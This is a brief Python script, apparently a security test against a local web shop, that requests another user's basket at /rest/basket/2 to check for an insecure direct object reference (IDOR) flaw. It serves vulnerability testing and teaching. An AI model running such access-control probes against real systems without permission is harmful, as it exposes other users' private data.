import requests

BASE_URL = "http://localhost:3000"

def test_idor_access():
    print("[*] Testing IDOR vulnerability")

    # Trying to access another user's basket
    response = requests.get(
        f"{BASE_URL}/rest/basket/2"
    )

    if response.status_code == 200:
        print("[!] Possible IDOR vulnerability detected")
    else:
        print("[+] Access control seems enforced")

if __name__ == "__main__":
    test_idor_access()
